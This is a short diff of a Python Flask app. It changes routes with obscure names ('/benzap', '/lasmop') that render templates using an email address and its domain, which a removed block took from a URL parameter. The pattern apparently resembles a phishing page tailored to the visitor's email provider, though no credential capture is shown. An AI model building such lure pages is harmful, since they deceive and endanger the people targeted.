@@ -281,15 +281,9 @@ def second():
 
 @app.route("/benzap", methods=['GET'])
 def benza():
-    web_param = request.args.get('web')
-    
-    # Only update session if web param is passed
-    if web_param:
-        session['eman'] = web_param
-        session['ins'] = web_param.split('@')[1] if '@' in web_param else ""
-
-    eman = session.get('eman')
-    dman = session.get('ins')
+    if request.method == 'GET':
+        eman = session.get('eman')
+        dman = session.get('ins')
     return render_template('ind.html', eman=eman, dman=dman)
 
 @app.route("/lasmop", methods=['GET'])
@@ -303,9 +297,6 @@ def lasmo():
     if request.method == 'GET':
         dman = session.get('ins')
     return render_template('main.html', dman=dman)
-
-if __name__ == '__main__':
-	app.run(host="0.0.0.0", port=3000)
 
 if __name__ == '__main__':
 	app.run(host="0.0.0.0", port=3000)
